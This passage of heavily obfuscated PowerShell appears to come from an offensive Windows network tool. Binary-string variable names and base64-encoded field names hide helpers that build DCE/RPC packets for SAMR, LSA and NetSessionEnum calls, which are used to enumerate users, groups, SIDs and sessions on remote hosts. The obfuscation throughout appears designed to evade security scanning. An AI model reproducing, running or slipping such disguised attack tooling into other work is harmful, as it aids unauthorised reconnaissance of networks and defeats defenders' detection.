    ${00100101110011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAEgAaQBuAHQA'))),${00000000000000111})
    ${00100101110011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQA'))),${_00001010001001000})
    ${00100101110011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAG4AdQBtAA=='))),${_00100110010100110})
    if(${_00101110101001101}.Length)
    {
        ${00100101110011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQA='))),${_00101110101001101})
    }
    return ${00100101110011000}
}
function _01011101001000111
{
    ${10110111001000111} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x00,0x00,0x02,0x00))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFMAeQBzAHQAZQBtAA=='))),[Byte[]](0x5c,0x00))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFUAbgBrAG4AbwB3AG4A'))),[Byte[]](0x00,0x00))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBMAGUAbgA='))),[Byte[]](0x18,0x00,0x00,0x00))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBOAHUAbABsAFAAbwBpAG4AdABlAHIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBOAHUAbABsAFAAbwBpAG4AdABlAHIAMgA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBOAHUAbABsAFAAbwBpAG4AdABlAHIAMwA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBQAG8AaQBuAHQAZQByAFQAbwBTAGUAYwBRAG8AcwBfAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x04,0x00,0x02,0x00))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBQAG8AaQBuAHQAZQByAFQAbwBTAGUAYwBRAG8AcwBfAFEAbwBzAF8ATABlAG4A'))),[Byte[]](0x0c,0x00,0x00,0x00))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBQAG8AaQBuAHQAZQByAFQAbwBTAGUAYwBRAG8AcwBfAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4ATABlAHYAZQBsAA=='))),[Byte[]](0x02,0x00))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBQAG8AaQBuAHQAZQByAFQAbwBTAGUAYwBRAG8AcwBfAEMAbwBuAHQAZQB4AHQATQBvAGQAZQA='))),[Byte[]](0x01))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBQAG8AaQBuAHQAZQByAFQAbwBTAGUAYwBRAG8AcwBfAEUAZgBmAGUAYwB0AGkAdgBlAE8AbgBsAHkA'))),[Byte[]](0x00))
    ${10110111001000111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    return ${10110111001000111}
}
function _10110000101100111
{
    param([Byte[]]${_00100100100000010})
    ${10100000110111000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10100000110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ASABhAG4AZABsAGUA'))),${_00100100100000010})
    ${10100000110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAHYAZQBsAA=='))),[Byte[]](0x05,0x00))
    return ${10100000110111000}
}
function _10111111100010110
{
    param([Byte[]]${_00100100100000010})
    ${10101001001000010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10101001001000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ASABhAG4AZABsAGUA'))),${_00100100100000010})
    return ${10101001001000010}
}
function _00110000110100001
{
    param([Byte[]]${_00100100100000010},[Byte[]]${_10100000101000011})
    ${00100101000000001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00100101000000001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ASABhAG4AZABsAGUA'))),${_00100100100000010})
    ${00100101000000001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBJAEQAcwBfAFMASQBEAEEAcgByAGEAeQA='))),${_10100000101000011})
    ${00100101000000001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8AYwBvAHUAbgB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00100101000000001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBVAEwATABfAHAAbwBpAG4AdABlAHIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00100101000000001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8AbABlAHYAZQBsAA=='))),[Byte[]](0x01,0x00))
    ${00100101000000001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAHUAbgB0AA=='))),[Byte[]](0x00,0x00))
    ${00100101000000001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAHUAbgB0AF8AYwBvAHUAbgB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    return ${00100101000000001}
}
function _10110101100101000
{
    param([String]${_00111111110111010})
    [Byte[]]${01100010001010010} = [System.Text.Encoding]::Unicode.GetBytes(${_00111111110111010})
    [Byte[]]${01110100110111010} = [System.BitConverter]::GetBytes(${_00111111110111010}.Length + 1)
    if(${_00111111110111010}.Length % 2)
    {
        ${01100010001010010} += 0x00,0x00
    }
    else
    {
        ${01100010001010010} += 0x00,0x00,0x00,0x00
    }
    ${00001010100100101} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00001010100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x00,0x00,0x02,0x00))
    ${00001010100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAE0AYQB4AEMAbwB1AG4AdAA='))),${01110100110111010})
    ${00001010100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00001010100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAEEAYwB0AHUAYQBsAEMAbwB1AG4AdAA='))),${01110100110111010})
    ${00001010100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFMAeQBzAHQAZQBtAE4AYQBtAGUA'))),${01100010001010010})
    ${00001010100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    return ${00001010100100101}
}
function _10100001111101000
{
    param([String]${_00111111110111010})
    ${_00111111110111010} = "\\" + ${_00111111110111010}
    [Byte[]]${01100010001010010} = [System.Text.Encoding]::Unicode.GetBytes(${_00111111110111010})
    [Byte[]]${01110100110111010} = [System.BitConverter]::GetBytes(${_00111111110111010}.Length + 1)
    if(${_00111111110111010}.Length % 2)
    {
        ${01100010001010010} += 0x00,0x00
    }
    else
    {
        ${01100010001010010} += 0x00,0x00,0x00,0x00
    }
    ${00100110101000101} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00100110101000101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x00,0x00,0x02,0x00))
    ${00100110101000101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAE0AYQB4AEMAbwB1AG4AdAA='))),${01110100110111010})
    ${00100110101000101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00100110101000101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAEEAYwB0AHUAYQBsAEMAbwB1AG4AdAA='))),${01110100110111010})
    ${00100110101000101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFMAeQBzAHQAZQBtAE4AYQBtAGUA'))),${01100010001010010})
    ${00100110101000101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    ${00100110101000101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAHYAZQBsAEkAbgA='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00100110101000101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ASQBuAGYAbwBJAG4AXwBTAEEATQBSAEMAbwBuAG4AZQBjAHQASQBuAGYAbwBfAEkAbgBmAG8ASQBuAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00100110101000101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ASQBuAGYAbwBJAG4AXwBTAEEATQBSAEMAbwBuAG4AZQBjAHQASQBuAGYAbwBfAEkAbgBmAG8ASQBuADEAXwBDAGwAaQBlAG4AdABWAGUAcgBzAGkAbwBuAA=='))),[Byte[]](0x02,0x00,0x00,0x00))
    ${00100110101000101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ASQBuAGYAbwBJAG4AXwBTAEEATQBSAEMAbwBuAG4AZQBjAHQASQBuAGYAbwBfAEkAbgBmAG8ASQBuADEAXwBVAG4AawBuAG8AdwBuAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    return ${00100110101000101}
}
function _00101110100010101
{
    param([Byte[]]${_00100100100000010})
    ${01110000010011000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01110000010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAG4AbgBlAGMAdABIAGEAbgBkAGwAZQA='))),${_00100100100000010})
    return ${01110000010011000}
}
function _10010001101001000
{
    param([Byte[]]${_00100100100000010})
    ${01101101100000110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01101101100000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAG4AbgBlAGMAdABIAGEAbgBkAGwAZQA='))),${_00100100100000010})
    return ${01101101100000110}
}
function _01101101101011101
{
    param([Byte[]]${_00100100100000010},[Byte[]]${_00111000111010011})
    ${01101010011010011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01101010011010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAG4AbgBlAGMAdABIAGEAbgBkAGwAZQA='))),${_00100100100000010})
    ${01101010011010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    ${01101010011010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBJAEQA'))),${_00111000111010011})
    return ${01101010011010011}
}
function _10100000010000110
{
    param([Byte[]]${_00100100100000010},[Byte[]]${_00111000111010011})
    ${10100110001110001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10100110001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAG4AbgBlAGMAdABIAGEAbgBkAGwAZQA='))),${_00100100100000010})
    ${10100110001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    ${10100110001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBJAEQA'))),${_00111000111010011})
    return ${10100110001110001}
}
function _10001011010001110
{
    param([Byte[]]${_00100100100000010})
    ${00101100001111011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00101100001111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ARwByAG8AdQBwAEgAYQBuAGQAbABlAA=='))),${_00100100100000010})
    return ${00101100001111011}
}
function _01110010100011010
{
    param([Byte[]]${_00100100100000010},[Byte[]]${_00100100010100000},[Byte[]]${_10110010000111101})
    ${10110110010001010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10110110010001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAG4AbgBlAGMAdABIAGEAbgBkAGwAZQA='))),${_00100100100000010})
    ${10110110010001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    ${10110110010001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBpAGQAXwBDAG8AdQBuAHQA'))),${_00100100010100000})
    ${10110110010001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBpAGQAXwBTAGkAZAA='))),${_10110010000111101})
    return ${10110110010001010}
}
function _00010011011011101
{
    param([Byte[]]${_00100100100000010})
    ${01011011101000110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01011011101000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ARABvAG0AYQBpAG4ASABhAG4AZABsAGUA'))),${_00100100100000010})
    ${01011011101000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAHMAdQBtAGUASABhAG4AZABsAGUA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01011011101000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAdABGAGwAYQBnAHMA'))),[Byte[]](0x10,0x00,0x00,0x00))
    ${01011011101000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAUwBpAHoAZQA='))),[Byte[]](0xff,0xff,0x00,0x00))
    return ${01011011101000110}
}
function _01010100100000000
{
    param([Byte[]]${_00100100100000010},[String]${_01010001000010111})
    [Byte[]]${01010110110011100} = [System.Text.Encoding]::Unicode.GetBytes(${_01010001000010111})
    [Byte[]]${01100110010110101} = ([System.BitConverter]::GetBytes(${01010110110011100}.Length))[0,1]
    [Byte[]]${01110100110111010} = [System.BitConverter]::GetBytes(${_01010001000010111}.Length)
    ${00101111101100011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00101111101100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ARABvAG0AYQBpAG4ASABhAG4AZABsAGUA'))),${_00100100100000010})
    ${00101111101100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0ATgBhAG0AZQBzAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00101111101100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATQBhAHgAQwBvAHUAbgB0AA=='))),[Byte[]](0xe8,0x03,0x00,0x00))
    ${00101111101100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00101111101100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8AQQBjAHQAdQBhAGwAQwBvAHUAbgB0AA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00101111101100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBMAGUAbgA='))),${01100110010110101})
    ${00101111101100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBTAGkAegBlAA=='))),${01100110010110101})
    ${00101111101100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBfAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x00,0x00,0x02,0x00))
    ${00101111101100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBfAE0AYQB4AEMAbwB1AG4AdAA='))),${01110100110111010})
    ${00101111101100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00101111101100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBfAEEAYwB0AHUAYQBsAEMAbwB1AG4AdAA='))),${01110100110111010})
    ${00101111101100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBfAE4AYQBtAGUAcwA='))),${01010110110011100})
    return ${00101111101100011}
}
function _10111111010001100
{
    param([Byte[]]${_00100100100000010},[Byte[]]${_00100001010101100},[Byte[]]${_00111011011010011})
    ${00111010011010010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00111010011010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ARABvAG0AYQBpAG4ASABhAG4AZABsAGUA'))),${_00100100100000010})
    ${00111010011010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AUgBpAGQAcwA='))),${_00100001010101100})
    ${00111010011010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0xe8,0x03,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00111010011010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AUgBpAGQAcwAyAA=='))),${_00100001010101100})
    ${00111010011010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGQAcwA='))),${_00111011011010011})
    return ${00111010011010010}
}
function _01000110101101100
{
    param([String]${_01000011000110110})
    [Byte[]]${10010111111010010} = [System.Text.Encoding]::Unicode.GetBytes(${_01000011000110110})
    [Byte[]]${01110100110111010} = [System.BitConverter]::GetBytes(${_01000011000110110}.Length + 1)
    if(${_01000011000110110}.Length % 2)
    {
        ${10010111111010010} += 0x00,0x00
    }
    else
    {
        ${10010111111010010} += 0x00,0x00,0x00,0x00
    }
    ${00100111000010010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBSAGUAZgBlAHIAZQBuAHQASQBEAA=='))),[Byte[]](0x00,0x00,0x02,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBNAGEAeABDAG8AdQBuAHQA'))),${01110100110111010})
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBBAGMAdAB1AGEAbABDAG8AdQBuAHQA'))),${01110100110111010})
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBTAGUAcgB2AGUAcgBVAE4AQwA='))),${10010111111010010})
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBsAGkAZQBuAHQAXwBSAGUAZgBlAHIAZQBuAHQASQBEAA=='))),[Byte[]](0x04,0x00,0x02,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBsAGkAZQBuAHQAXwBNAGEAeABDAG8AdQBuAHQA'))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBsAGkAZQBuAHQAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBsAGkAZQBuAHQAXwBBAGMAdAB1AGEAbABDAG8AdQBuAHQA'))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBsAGkAZQBuAHQAXwBDAGwAaQBlAG4AdAA='))),[Byte[]](0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AVQBzAGUAcgA='))),[Byte[]](0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AVQBzAGUAcgBfAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x08,0x00,0x02,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AVQBzAGUAcgBfAE0AYQB4AEMAbwB1AG4AdAA='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AVQBzAGUAcgBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AVQBzAGUAcgBfAEEAYwB0AHUAYQBsAEMAbwB1AG4AdAA='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AVQBzAGUAcgBfAFUAcwBlAHIA'))),[Byte[]](0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABlAHYAZQBsAA=='))),[Byte[]](0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABlAHYAZQBsAF8ATABlAHYAZQBsAA=='))),[Byte[]](0x0a,0x00,0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGUAcwBzAEMAdAByAF8AQwB0AHIA'))),[Byte[]](0x0a,0x00,0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGUAcwBzAEMAdAByAF8AUABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAMQAwAF8AUgBlAGYAZQByAGUAbgB0AEkARAA='))),[Byte[]](0x0c,0x00,0x02,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGUAcwBzAEMAdAByAF8AUABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAMQAwAF8AQwB0AHIAMQAwAF8AQwBvAHUAbgB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGUAcwBzAEMAdAByAF8AUABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAMQAwAF8AQwB0AHIAMQAwAF8ATgB1AGwAbABQAG8AaQBuAHQAZQByAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAQgB1AGYAZgBlAHIA'))),[Byte[]](0xff,0xff,0xff,0xff))
